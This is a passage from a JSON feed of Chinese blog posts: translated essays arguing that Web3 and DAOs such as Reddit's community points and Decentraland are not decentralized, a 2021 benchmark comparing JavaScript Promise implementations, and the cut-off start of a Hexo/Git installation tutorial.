而被黑客攻击、所有的资金全部化为乌有，以太坊网络被迫硬分叉来保护投资者的合约。当然，相比继续讨论 DAO 的失败案例，我们还是讨论一下这些实践是如何运作的吧。</p>\n<h3>案例分析：Reddit 社区代币</h3>\n<p>让我们把这一切带回我们开始的地方：Web3 的趋势与互联网上的社交媒体巨头。正如我之前所说，Reddit 是最有兴趣加入 DAO 并开始称自己为 「去中心化」的网站，所以我们将从那里开始。</p>\n<p>这里要做的明显比较是，Reddit 是一个类似于 Usenet 的中心化网站。Reddit 承载着 Subreddit，并提供审核工具，既包括 Upvote / Downvote 的形式，也包括实际的版主形式。在 Reddit 上，严格禁止操纵 Upvote / Downvote 的行为，网站管理员使用自动化工具禁止任何人这样做。这为子版块的社区创造了一种决定哪些内容是最好的方式，并将这些优质内容推广到前面，无论他们是一个偶然的潜水者还是一个活跃的成员发表的。这是 Reddit 运作的基础，到目前为止，它运作得相当好。</p>\n<p>随着社区积分的引入，Reddit 声称他们允许会员「拥有他们喜欢的社区的一部分」，就像股东拥有他们喜欢的公司的一部分一样。积分是衡量声誉的一个标准，是用于投票或福利的货币，如徽章、表情符号、GIF 等，以炫耀你的财富。投票是不具约束力的公投，采用一人一票和每点一票的方式计算。在投票过程中，积分不会被消耗。每隔四周，Reddit 网站会公布每个用户的名单，他们获得了多少 Karma，以及他们将获得多少积分作为补偿。对这个名单的修改可以用积分投票的方法提出。</p>\n<p>这里应该很明显的一点是，这根本就不是去中心化。因为你甚至不能在 Reddit 的系统中投票选举新版主。当然，你也不能建立属于你自己的 Subreddit，并在那里建立一个社区；或者从 Reddit 主网络中分叉出来，创建一套新的独立子版块；或者规避 Reddit 网站管理员的意愿；或者逃避 Reddit 是一个需要盈利的企业的事实、而让用户购买假的互联网积分、并让用户产生自己拥有控制的错觉。</p>\n<h3>案例分析：Decentraland</h3>\n<p><img src=\"https://npm.elemecdn.com/sks@0.6.2/decentraland.jpg\" alt=\"decentraland.png\" width=\"1207\" height=\"682\"></p>\n<p>抛开 Reddit，现在让我们请出 <a href=\"https://decentraland.org/\">Decentraland</a>。这是一个用于创建虚拟世界的 DAO，这个概念如今也被称为「元宇宙」。</p>\n<p>Decentraland 允许用户对 Decentraland 生态系统内的各种政策和变量进行投票，例如增加新的可穿戴设备，对某些项目的拨款，市场费用，允许使用的基础设施等。还存在一个安全顾问委员会、有权力扔掉现有的合约、改用修复了漏洞的合约。<a href=\"https://governance.decentraland.org/\">你可以在这里查看这些提案的一些例子</a>。一个特别有趣的是这个拨款提案，<a href=\"https://governance.decentraland.org/proposal/?id=47e1bb80-4139-11ec-be0c-afec86cba5e5\">以增加对一个被称为 IPSME 的元宇宙协议的支持</a>，这是我想改天进一步调查的事情。</p>\n<p>Decentraland 从根本上说是在一个被称为 MANA 的可替换代币上运行的，它被用于所有系统内的交易。虽然投票是使用 <a href=\"https://docs.snapshot.org/\">Snapshot</a> 进行的，没有交易费用（Gas），<a href=\"https://docs.decentraland.org/decentraland/what-do-you-need-to-participate/\">但你的投票权是由你拥有的游戏中的货币数量加权的</a>。这（在理论上）<strong>使已建立的富裕用户比新建立的贫穷账户更重要</strong>，使用的系统非常类似于标准加密货币中的股权证明工作。</p>\n<p>虽然我不能证明 Decentraland 遵循了这一点，但 DAO 中一个常见的投票结构是「<a href=\"https://en.wikipedia.org/wiki/Quadratic_voting\">平方投票法</a>」。这是为了判断一个人的偏好程度，而不是单纯的二元 是 / 否。通过对每一票收取幂等的货币 / 代币 / 金钱 / 等等(例如：1 票 = 1 美元，2 票 = 4 美元，3 票 = 8 美元，等等）。<strong>如果每个被投票的人都有一个固定的、一致的点数来分配给投票，那么这个方法就相当好，但如果把它与货币联系起来，你就会产生大量的问题。</strong></p>\n<p>举例说明，穷人只有更少的货币来表达他们的偏好。虽然一个穷人为了实现他们的诉求，愿意牺牲自己所有的一切，但是他们很容易就被一个有着相反偏好的富人所推翻。请看，非洲贫困国家缺乏公共交通、缺乏无障碍辅助设备、缺乏药物、缺乏纯净的饮用水和健康的食品供应。当地人并不是不需要这些东西，只是因为在富人们眼中，这些穷人的生活不值得被改善。 在美国，许多非白人的贫困社区因为「城市更新」政策被迫拆除、土地被用于修建高速公路，就是一个典型的例子。</p>\n<p>还有一个问题是，整个系统的模式是通过人为的稀缺性来获利。在 Decentraland 上的一票、一块土地、一件衣服或什么的，<strong>只是一系列的比特和字节，完全可以被自由复制或扩展</strong>。我特别厌恶 NFT 的主要原因是我对人工稀缺性的概念的厌恶，这种东西在 NFT 发明之前就已经困扰着数字世界，强硬的知识产权法充其量只是将大量的流行文化束缚在地下粉丝艺术家手中。我们的经济体系认为，自然和人类的创造物不是给世界的礼物，要负责任地和可持续地使用，而是作为资源被开发到其极限。自然，开发自然资源和荒谬的能源需求，仅仅是为了加强互联网上的物品的价值，这将是最终的结局，因为对我们来说，唯一重要的事情似乎是我们是否能从我们得到的礼物中产生投资回报。</p>\n<p>值得注意的是，我并非反对艺术家，出版社，版权委托书。我认为艺术印刷品在 Ko-Fi、Pateron 上付费是对创作伟大内容的回报，而不是一种贪婪地攫取金钱、希望从中获利的手段。<strong>NFT 正是因为无视艺术是情感的表达、是付诸了爱的劳动的概念，倾向于大规模生产垃圾赚快钱</strong>，才被我鄙视的。</p>\n<p>很明显，Decentraland 没有规定杜绝这种理念，除非硬分叉源代码，不做 Decentraland。如果  DAO 不能从平台上的交易费中获得足够的投资回报来继续运营，Decentraland 服务器本身也完全有可能倒闭。当然，<strong>所有的投票将主要由那些已经从 Decentraland 的方式中获益最多的人决定，他们对公平的竞争环境兴趣不大，而更愿意投票给那些给他们带来更多财富的东西，创造一个非常不平等和不公平的虚拟社会</strong>。</p>\n<p>我的最终结论是，Decentraland 是一个非常有趣的平台，<strong>但它有固有的等级制度，来自早期主要参与者积累的财富。</strong>从本质上讲，它和 Reddit 一样是一个单一的网站，拥有最多的代币的人就如 Reddit 的管理员和版主一样、凌驾于其他普通用户之上。如果 Decentraland 不使用区块链、将数据完全存储在 Decentraland 中心化的服务器上，或使用 Steam 钱包余额而不是 ERC-20 作为代币，以及通过纸质合同和法务部来执行公司内部的拨款，<strong>那么这个中心化的系统和现有的在区块链上运行的系统本质上仍然是完全相同的</strong>。如果 Decentraland 的服务器瘫痪，Decentraland 上的任何东西都没有价值；在它的生态之外，Decentraland 的任何东西也没有任何价值。简单地说，我不能真诚地称其拥有丝毫的去中心化。</p>\n<div class=\"license\">\n<div>[译] 不，Web3 不是去中心化</div>\n<div><a href=\"https://blog.skk.moe/post/web3-is-not-decentralization/\">https://blog.skk.moe/post/web3-is-not-decentralization/</a></div>\n<div>            <div>              <div>本文作者</div>\n<div>Sukka</div>\n</div>\n<div>              <div>发布于</div>\n<div>2021-12-14</div>\n</div>\n<div>              <div>许可协议</div>\n<div><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/web3-is-not-decentralization/"},{"title":"[译] 捍卫自由的互联网，对 Web3 说不","date":"2021-12-12 13:40:00","description":"\n<h2>来自译者的楔子</h2>\n<p>作为一个充满泡沫和噱头的新概念，Web3 和元宇宙在区块链的社区中掀起了一波浪潮。鼓吹者坚信 Web3 就是互联网的未来、不惜砸下大把的金钱和精力、希望能在未来中捞一杯羹；而大部分人保持观望的态度。是时候来一点 Web3 的反对意见了。</p>\n<p>这篇译文将会作为我驳斥 Web3 的引子。在新的一年里，我会继续撰写评论文章、翻译来自区块链社区的观点，揭露 Web3 的谎言、戳破元宇宙的泡沫。</p>\n<blockquote><p>原文标题：Keep the web <strong>free</strong>, say <strong>no</strong> to <strong>Web3</strong><br>原文链接：<a href=\"https://yesterweb.org/no-to-web3/index.html\">https://yesterweb.org/no-to-web3/index.html</a><br>原文作者：<a href=\"https://yesterweb.org/\">Yesterday Web</a><br>译者：<a href=\"https://skk.moe/\">Sukka</a></p></blockquote>\n<p>Web3 被支持者称为一个想法、一个运动、新一代的互联网。</p>\n<p>Web3 被视为互联网的「未来」。这个概念由 <a href=\"https://www.sfchronicle.com/tech/article/Crypto-has-a-bro-problem-Women-in-the-field-say-16336453.php\">一群加密货币狂热者</a> 提出，基于现有的公共区块链。</p>\n<h2>Web3 声称其由社区管理</h2>\n<blockquote><p>虽然一个穷人为了实现他们的诉求，愿意牺牲自己所有的一切，但是他们很容易就被一个有着相反偏好的富人所推翻。请看，非洲贫困国家缺乏公共交通、缺乏无障碍辅助设备、缺乏药物、缺乏纯净的饮用水和健康的食品供应。当地人并不是不需要这些东西，只是因为在富人们眼中，这些穷人的生活不值得被改善。</p></blockquote>\n<p>许多 Web3 社区和加密货币有关社区都使用「<a href=\"https://en.wikipedia.org/wiki/Quadratic_voting\">平方投票法</a>」，即允许参与者表达他们对一个观点的偏好程度、而不是简单的「赞成」与「反对」。但是不幸的是，「你喜欢这个吗？」已经变成了「用你的钱告诉我，你有多喜欢这个」。换句话说，在决定 Web3 走向的道路中，参与者可以通过撒币来表达他们的诉求。</p>\n<p>InvisibleUp 的文章「<a href=\"https://invisibleup.com/articles/38/\">不，Web3 不是去中心化</a>」详细而有力地阐述了这个观点。</p>\n<h2>Web3 声称其是去中心化的</h2>\n<p>去中心化肯定是好事，但是加密货币和区块链绝对不是去中心化的唯一实现。请见 Soatok 发表在 Dhole Moments 上的文章「<a href=\"https://soatok.blog/2021/10/19/against-web3-and-faux-decentralization/\">Against Web3 and Faux-Decentralization</a>」。</p>\n<p>非常凑巧的是，Web3 的许多关键的「去中心化」基础设施都运行在由互联网巨头亚马逊提供的 中心化云计算服务 AWS 上（参见来自英国伍尔弗汉普顿大学的经济学家、数字货币投资者 Shaurya Malwa 发表的文章 「<a href=\"https://decrypt.co/44321/70-of-ethereum-nodes-are-hosted-on-centralized-services\">70% of Ethereum Nodes Are Hosted on Centralized Services</a>」），并且由「内幕人士」而非广大社区负责运营（参见区块链研究者、数字货币投资者 David Canellis 于 2019 年就以太坊硬分叉发表的评论文章「<a href=\"https://thenextweb.com/news/ethereum-insiders-fire-back-nodes\">Ethereum insiders deny there’s only one computer keeping a copy of its blockchain</a>」）。</p>\n<h2>Web3 声称要消除互联网的「中间人」</h2>\n<blockquote><p>想象一下，在 Web3 的倡议和提案中，用户将会真正拥有他们的数据。哇！那为什么像 Twitter 和 Facebook 的互联网巨头会允许有人破局呢？他们正在嫌赚的钱不够多呢！<br>—— Auzzie Jay。</p></blockquote>\n<p>Web3 的支持者缄口不谈他们将会如何消除被称为「中间人，Man in the Middle」的互联网巨头。不过，你如果想一下的话，他们刚刚好铲除了一个互联网巨头——Facebook，毕竟他们已经改名「元（Meta）」了，嗯。</p>\n<h2>Web3 声称要彻底杜绝数据泄露</h2>\n<p>不知道命运是否充满了讽刺，以太坊自己就因为数据泄露而损失了 5500 万美元（参见美国彭博社记者 Matthew Leising 出版的书籍「Out of the Ether: The Amazing Story of Ethereum and the $55 Million Heist That Almost Destroyed It All」、<a href=\"https://www.coindesk.com/tech/2020/09/17/the-55m-hack-that-almost-brought-ethereum-down/\">详细介绍了以太坊的历史、以及以太坊损失 5500 万美元的前后故事</a>）。</p>\n<p>Insider Inc. 签约作者 Carla Mozée 在四个月前（译者注：即 2021 年 8 月 31 日）发表了一篇文章「<a href=\"https://markets.businessinsider.com/news/currencies/cryptocurrency-hacks-fraud-cases-record-bitcoin-ethereum-wallets-breaches-defi-2021-8\">Cryptocurrency hacks and fraud are on track for a record number of incidents in 2021, data shows</a>」，详细介绍了过去八个月里发生的有关加密货币的非法集资、诈骗、黑客攻击事件、以及造成的损失。</p>\n<h2>Web3 声称要解决「双重开支」问题</h2>\n<blockquote><p>译者注：你可以把「双重开支」想象为开出的支票被复制，导致同一笔消费让你的账户被反复扣款。加密货币的 51% 攻击就是一个典型的「双重开支」问题。</p></blockquote>\n<p>加密货币并不能阻止「双重开支」问题，以至于社区为此发明了一个名词「51% 攻击」。当一个实体获得了整个区块链网络中超过 51% 的控制权，就能通过「最长链原则」控制这个区块链网络的走向、从而伪造交易。这种攻击是如此的普遍，以至于每年至少要发生一次，如 <a href=\"https://news.bitcoin.com/privacy-coin-verge-third-51-attack-200-days-xvg-transactions-erased/\">2018 年 Verge 遭遇三次 51% 攻击</a>、<a href=\"https://thehackernews.com/2019/01/ethereum-double-spend-attack.html\">2019 年以太坊经典遭遇双重开支攻击，损失达 110 万美元</a> 和 2020 年 <a href=\"https://cointelegraph.com/news/bitcoin-gold-blockchain-hit-by-51-attack-leading-to-70k-double-spend\">比特黄金遭遇 51% 攻击，导致了 7 万美元的双重开支</a>。</p>\n<p>所有区块链应用（不仅仅是加密货币）在设计时，都需要预防一个实体、或多个实体的组合控制超过一半的网络，但是 Web3 显然没有考虑到这一点。</p>\n<h2>Web3 从人为制造的稀缺性中获利</h2>\n<blockquote><p>为了获得最大的利润，生产者会限制生产、而不是确保对资源的最大化利用。</p></blockquote>\n<p>由于 Web3 和数字货币密切相关，因此不可避免地继承了数字货币「通过人为制造的稀缺性中获利」的本质。尽管「通过技术、生产或分享，理论上可以创造出无限丰富的数字化实体」，但是它们依然是稀缺的、控制在少数人手中。</p>\n<p>「人为制造的稀缺」是一个经典的经济学概念，你可以在 <a href=\"https://en.wikipedia.org/wiki/Artificial_scarcity\">Wikipedia 上读到浅显易懂的介绍</a>。</p>\n<h2>Web3 满足的是大鳄和投机者，而非整个互联网</h2>\n<p>React Native 应用开发者、Serverless 和 JAMstack 领域的专家、前 AWS 技术带头人 Nader Dabit 曾经在他的文章 <a href=\"https://www.freecodecamp.org/news/what-is-web3/\">What is Web3? The Decentralized Internet of the Future Explained</a> 中介绍了「与 Facebook 等互联网巨头不同」的公司会如何构建 Web3：</p>\n<ul>\n<li>宣发一个新的、令人激动的项目</li>\n<li>任何人都可以从第一天开始参与建设，或天使投资</li>\n<li>公司发布一些代币、10% 用于奖励早期建设者、10% 卖给天使投资人，剩下的留作未来开支的预算</li>\n<li>投资者和建设者 <strong>需要用代币来为项目的未来投票</strong>\n</li>\n<li><strong>谁拥有的代币越多，谁就有话语权</strong></li>\n</ul>\n<hr>\n<p>记住，任何推动 Web3 或是加密货币的人都是那些能从中获得真实利润的人，他们对互联网的未来毫不关心：</p>\n<ul>\n<li><a href=\"https://www.coindesk.com/tech/2021/08/26/microsoft-is-awarded-us-patent-for-crypto-token-creation-service/\">微软成功获得加密代币创建服务（Crypto Token Creation as a Service）的专利</a></li>\n<li><a href=\"https://thenextweb.com/news/nike-blockchain-sneakers-cryptokick-patent\">耐克现在拥有将区块链用于运动鞋的专利：CryptoKicks</a></li>\n<li><a href=\"https://adage.com/article/marketing-news-strategy/mcdonalds-gets-inito-nft-game-mcrib/2376996\">麦当劳发行 MCNFT 纪念 Mcrib 的回归</a></li>\n<li><a href=\"https://www.scmp.com/lifestyle/k-pop/article/3155551/nfts-and-cryptocurrency-draw-k-pop-labels-behind-bts-blackpink\">BTS、Blackpink、Twice 和其他团体背后的 K-Pop 寻求用 NFT 和加密货币来说服粉丝消费</a></li>\n<li><a href=\"https://cointelegraph.com/news/reddit-to-reportedly-tokenize-karma-points-and-onboard-500m-new-users\">Reddit 将其 5 亿用户的 Karma 转换为 ERC-20 代币</a></li>\n</ul>\n<p>Web3 只会进一步加剧贫富差距、加剧社会分层、加剧阶级隔阂。</p>\n<div class=\"license\">\n<div>[译] 捍卫自由的互联网，对 Web3 说不</div>\n<div><a href=\"https://blog.skk.moe/post/keep-web-free-say-no-to-web3/\">https://blog.skk.moe/post/keep-web-free-say-no-to-web3/</a></div>\n<div>            <div>              <div>本文作者</div>\n<div>Sukka</div>\n</div>\n<div>              <div>发布于</div>\n<div>2021-12-12</div>\n</div>\n<div>              <div>更新于</div>\n<div>2021-12-13</div>\n</div>\n<div>              <div>许可协议</div>\n<div><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/keep-web-free-say-no-to-web3/"},{"title":"2021 年 JavaScript Promise 性能对比","date":"2021-12-07 08:19:00","description":"\n<p>我们正生活在一个「Any application that can be written in JavaScript, will eventually be written in JavaScript」的时代。作为一门兼具动态性和简单性的语言，JavaScript 已经占领了客户端、服务端，甚至在机器学习中也占据一席之地；不可避免的，异步执行也逐渐成为这门语言不可缺少的一部分。</p>\n<h2>TL; DR</h2>\n<ul>\n<li>Bluebird 依然是速度最快、内存占用最少的 Promise 实现</li>\n<li>Runtime 的 async / await 实现越来越快、顺序执行的性能已经超过 Native Promise，占用的内存也更少</li>\n<li>对于平行并发执行的 Promise，Bluebird 的性能依然一骑绝尘。编写运行在 Node.js 上的服务端程序仍然需要评估是否有必要引入 Bluebird</li>\n<li>所有对 Async / Await 的转译都不可避免的引入性能损耗；TypeScript Compiler（tsc）转译时引入的性能开销尤为明显，一般比原生 Async / Await 要慢至少两倍，同时要消耗更多的内存。</li>\n</ul>\n<h2>背景知识</h2>\n<h3>Node.js / v8 的 Promise 实现</h3>\n<p>关于 Bluebird vs Native，相信大部分读者肯定有一个问题：Bluebird 作为 Promise 的一个 JavaScript 实现，竟然会比 V8（Node.js 是基于 Chrome 的 V8 JavaScript 引擎的 Runtime）的 Native Promise 实现还快？</p>\n<p>实际上在 2017 年之前，<a href=\"https://github.com/v8/v8/blob/5.7.141/src/js/promise.js\">V8 的 Promise 也是用 JavaScript 实现的</a>、且并不完美，例如 <a href=\"https://github.com/v8/v8/blob/5.3.54/src/js/promise.js#L116-L119\">在 Promise 初始化时就分配数组给 Promise Handler</a> 导致不必要的内存占用；<a href=\"https://github.com/v8/v8/commit/1d4fe00287eabfb64d6bba51d685b2e668f179af\">V8 直到 2016 年 5 月才对此进行了优化</a>（V8 5.3.55）。<a href=\"https://github.com/v8/v8/commit/52e2c154ff18ae0e7ca807a5ad539750297c31b3#diff-9794588c64c777658e9ceb960f46260d0c49484ceb41e13dd1cc65ae1f05bd13\">V8 到 2016 年 12 月开始使用 C++ 实现 Promise</a>（V8 5.7.142）、在 Node.js 8 中落地（Node.js 7 使用的是 V8 5.5，Node.js 8 使用的是 V8 5.8）。</p>\n<h3>衡量 Promise 性能的方式</h3>\n<p><a href=\"https://blog.spion.dev/\">Gorgi Kosev</a> 在 2013 年 8 月发布了「<a href=\"https://blog.spion.dev/posts/analysis-generators-and-other-async-patterns-node.html\">Analysis of generators and other async patterns in node</a>」，详细介绍了 Generator Function，并与当时常见的异步实现（如 <code>Q.js</code>）、回调地狱的解决方案（<code>flatten.js</code>）的性能和编写难度进行了比较。Gorgi Kosev 提供了一段基于 Doxbee 的业务伪代码、涉及「数据库连接」「数据库事务回滚」「文件上传」「查询执行」等典型的 CRUD 和阻塞操作。后来，Bluebird 的作者为这段伪代码补充了一个 mock context，「Doxbee Benchmark」便成为了衡量 JavaScript 异步实现的性能的标准方法。V8 团队的 Maya Lekova 在 <a href=\"https://github.com/tc39/ecma262/pull/1250\">修改 ECMAScript Spec</a> 时，也使用了 Doxbee Benchmark 的数据来阐述修改的必要性。</p>\n<blockquote><p>顺便一提，早期 Promise 实现的性能完全无法入眼、一直被 JavaScript 开发者诟病，直到 2013 年 12 月 Petka Antonov 发布了 Bluebird 的首个版本，JavaScript 社区对 Promise 的印象才大幅改观。</p></blockquote>\n<h3>Bluebird 为什么这么快？</h3>\n<p>Bluebird 发布时，比同类实现快了将近 100 倍、内存占用却不到同类的十分之一；数年过去了，JavaScript 引擎的 JIT 不断进化（例如 V8 用 Turbofan 代替了 CrankShift），Bluebird 的性能依然在众多实现中出类拔萃脱颖而出。2016 年 Bluebird 的作者 Petka Antonov 写过一篇文章「<a href=\"https://www.reaktor.com/blog/javascript-performance-fundamentals-make-bluebird-fast/\">Three JavaScript performance fundamentals that make Bluebird fast</a>」，分享了三个简单且行之有效的 JavaScript 性能优化技巧。</p>\n<h2>Benchmark</h2>\n<p>此次 Benchmark 基于 V8 团队衡量 Async 优化、修改 ES Spec 时使用的 <a href=\"https://github.com/v8/promise-performance-tests/\">v8/promise-performance-tests</a> Benchmark Suite，额外增加了内存 RSS 统计，你可以前往 <a href=\"https://github.com/sukkaw/promise-performance-tests\">查看 Fork 后修改的版本</a>。</p>\n<p>运行环境为：</p>\n<pre><code class=\"hljs plaintext\">OS: Darwin 21.1.0 x64CPU: Intel(R) Core(TM) i9-9880H CPU @ 2.30GHz x 16Memory: 32768 MiB</code></pre>\n<h3>Bluebird vs Native Promise vs Native Async / Await</h3>\n<h4>顺序执行</h4>\n<p>顺序执行的 Promise 的特点是后一个 Promise 会用到前一个 Promise resolve 的值、只能在前一个 Promise fullfil 后执行：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> user = <span class=\"hljs-keyword\">await</span> <span class=\"hljs-title function_\">fetch</span>(<span class=\"hljs-string\">'/api/users/1'</span>);<span class=\"hljs-keyword\">const</span> job = <span class=\"hljs-keyword\">await</span> <span class=\"hljs-title function_\">fetch</span>(<span class=\"hljs-string\">`/api/jobs/<span class=\"hljs-subst\">${user.jobId}</span>`</span>);<span class=\"hljs-keyword\">const</span> colleagues = <span class=\"hljs-keyword\">await</span> <span class=\"hljs-title function_\">fetch</span>(<span class=\"hljs-string\">`/api/users/job/<span class=\"hljs-subst\">${job.id}</span>`</span>);</code></pre>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.7/1.png\" alt=\"1\" width=\"3061\" height=\"1815\"></p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.7/2.png\" alt=\"2\" width=\"3066\" height=\"1815\"></p>\n<p><strong>从 Node.js 12 开始，async/await 异步顺序执行的速度最快、占用内存最少</strong>，和 Node.js 12 使用的 V8 版本包含 Fast Async 的 Patch 不无关系；同时，Bluebird 比 Native Promise 的速度要快，占用的内存也更少。</p>\n<h4>平行执行</h4>\n<p>平行执行的 Promise 特点是数个 Promise 之间不存在依赖关系；虽然 JavaScript 是单线程的，当一个 Promise（非阻塞地）从外部 Worker（如 Network、File I/O 等）等待响应数据时，Runtime 可以将下一个 Promise 塞入 Event Loop 中：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> userIds = [<span class=\"hljs-number\">21</span>, <span class=\"hljs-number\">42</span>, <span class=\"hljs-number\">84</span>, <span class=\"hljs-number\">168</span>];<span class=\"hljs-keyword\">const</span> users = <span class=\"hljs-keyword\">await</span> <span class=\"hljs-title class_\">Promise</span>.<span class=\"hljs-title function_\">all</span>(userIds.<span class=\"hljs-title function_\">map</span>(<span class=\"hljs-function\"><span class=\"hljs-params\">id</span> =&gt;</span> <span class=\"hljs-title function_\">fetch</span>(<span class=\"hljs-string\">`/api/users/<span class=\"hljs-subst\">${id}</span>`</span>)));</code></pre>\n<p>平行执行的 Promise 的特点是使用 <code>Promise.all</code> 或 <code>Promise.allSettled</code>；Bluebird 除 <code>Bluebird.all</code> 以外，还有 <code>Bluebird.map</code> 和 <code>Bluebird.join</code> 可被用于平行执行。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.7/3.png\" alt=\"3\" width=\"3066\" height=\"1815\"></p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.9/4.png\" alt=\"4\" width=\"3052\" height=\"1782\"></p>\n<p>Bluebird 在平行执行时的性能一骑绝尘，比 Native 实现速度快 2~3 倍、内存占用却微不足道。</p>\n<h3>Native Promise vs JavaScript Promise</h3>\n<p>截至本文写就，绝大部分浏览器均已支持 Promise。但是如果要为古董浏览器如 IE 提供 Promise 支持，则依然需要使用 JavaScript 实现的 Polyfill。</p>\n<p>参与 Benchmark 的 Promise 实现有：</p>\n<ul>\n<li><a href=\"http://bluebirdjs.com/\">Bluebird</a></li>\n<li>\n<a href=\"https://github.com/zloirock/core-js\">core-js</a>（Babel、swc 都依赖的 polyfill 集合）</li>\n<li><a href=\"https://www.npmjs.com/package/es6-promise\">es6-promise@npm</a></li>\n<li><a href=\"https://www.npmjs.com/package/es6-promise-polyfill\">es6-promise-polyfill@npm</a></li>\n<li><a href=\"https://www.npmjs.com/package/promise\">promise@npm</a></li>\n<li><a href=\"https://www.npmjs.com/package/promise-polyfill\">promise-polyfill@npm</a></li>\n<li>\n<a href=\"https://www.npmjs.com/package/q\">Q.js</a>（支持 <code>new Q.Promise</code> 和 <code>Q.Promise</code> 两种使用方式，测试时调用不使用 <code>new</code>）</li>\n<li>\n<a href=\"https://www.npmjs.com/package/spromisemespeed\">SPromiseMeSpeed</a> （自称是最快的 Promise 实现、比 Bluebird 还快 2~548 倍）</li>\n<li><a href=\"https://www.npmjs.com/package/zousan\">Zousan</a></li>\n</ul>\n<h4>顺序执行</h4>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.8/5.png\" alt=\"5\" width=\"2905\" height=\"1824\"></p>\n<p>不出意外，Bluebird 顺序执行的性能比 Native 还要优秀，内存占用更是不到 Native 的 1/3；<code>core-js</code>、<code>SPromiseMeSpeed</code>、<code>promise@npm</code> 和 <code>es6-promise-polyfill@npm</code> 的性能与内存占用和 Native 实现接近。</p>\n<h4>平行执行</h4>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.7/6.png\" alt=\"6\" width=\"2905\" height=\"1828\"></p>\n<p>Bluebird 在平行执行上的表现依然一骑绝尘，<code>promise@npm</code> 也取得了类似的不凡成绩；而 <code>core-js</code> 等提供 Polyfill 则显得些许力不从心。</p>\n<h3>Async / Await</h3>\n<p>截止到本文写就，不支持 Async Function 的浏览器也已经屈指可数。如果要向下兼容仅支持 ES2016 甚至 ES5 的浏览器的话，依然需要通过转译的方式来模拟 Async Function 的行为。</p>\n<p>参与 Benchmark 的转译器有：</p>\n<ul>\n<li>\n<a href=\"https://babeljs.io/\">Babel</a> 默认使用的 <a href=\"https://www.npmjs.com/package/regenerator-runtime\"><code>regenerator-runtime</code></a>\n</li>\n<li>Babel 的一个非官方插件 <a href=\"https://www.npmjs.com/package/fast-async\">fast-async</a>\n</li>\n<li>Babel 的另一个非官方插件 <a href=\"https://www.npmjs.com/package/babel-plugin-transform-async-to-promises\">babel-plugin-transform-async-to-promises</a>\n</li>\n<li>\n<a href=\"https://www.typescriptlang.org/docs/handbook/2/basic-types.html#tsc-the-typescript-compiler\">tsc</a>，TypeScript 的官方 Compiler</li>\n</ul>\n<p>Benchmark 包括顺序执行（doxbee）、平行执行（parallel）和一个由 v8 提供的 Fibonacci 的计算测试：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">async</span> <span class=\"hljs-keyword\">function</span>* <span class=\"hljs-title function_\">fibonacciSequence</span>(<span class=\"hljs-params\"></span>) {  <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> a = <span class=\"hljs-number\">0</span>, b = <span class=\"hljs-number\">1</span>; ;) {    <span class=\"hljs-keyword\">yield</span> a;    <span class=\"hljs-keyword\">const</span> c = a + b;    a = b;    b = c;  }}<span class=\"hljs-keyword\">async</span> <span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">fibonacci</span>(<span class=\"hljs-params\">id, n</span>) {  <span class=\"hljs-keyword\">for</span> <span class=\"hljs-keyword\">await</span> (<span class=\"hljs-keyword\">const</span> value <span class=\"hljs-keyword\">of</span> <span class=\"hljs-title function_\">fibonacciSequence</span>()) {    <span class=\"hljs-keyword\">if</span> (n-- === <span class=\"hljs-number\">0</span>) <span class=\"hljs-keyword\">return</span> value;  }};</code></pre>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.7/7.png\" alt=\"7\" width=\"3396\" height=\"2067\"></p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.7/8.png\" alt=\"8\" width=\"3391\" height=\"2071\"></p>\n<div class=\"license\">\n<div>2021 年 JavaScript Promise 性能对比</div>\n<div><a href=\"https://blog.skk.moe/post/promise-performance-benchmark/\">https://blog.skk.moe/post/promise-performance-benchmark/</a></div>\n<div>            <div>              <div>本文作者</div>\n<div>Sukka</div>\n</div>\n<div>              <div>发布于</div>\n<div>2021-12-07</div>\n</div>\n<div>              <div>许可协议</div>\n<div><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/promise-performance-benchmark/"},{"title":"在 Windows 上快速安装 Hexo · 安装 Git","date":"2021-11-12 13:30:00","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%89%8D%E8%A8%80\" class=\"headerlink\" title=\"前言\"></a>前言</h2>\n<p><strong>本文未经允许，禁止转载！</strong></p>\n<p><strong>视频教程正在制作，等待更新。</strong></p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%96%87%E7%AB%A0%E7%9B%AE%E5%BD%95\" class=\"headerlink\" title=\"文章目录\"></a>文章目录</h3>\n<ul><li><a href=\"https://blog.yfun.top/posts/hexo-blog/install-git\">安装 Git</a></li></ul>\n<blockquote><p>更多文章等待更新...</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%B8%8B%E8%BD%BD\" class=\"headerlink\" title=\"下载\"></a>下载</h2>\n<p>前往 Git 官网 (<a href=\"https://git-scm.com/\">https://git-scm.com</a>).</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112204849.png\"></p>\n<p>点击页面中的 <code>Download For 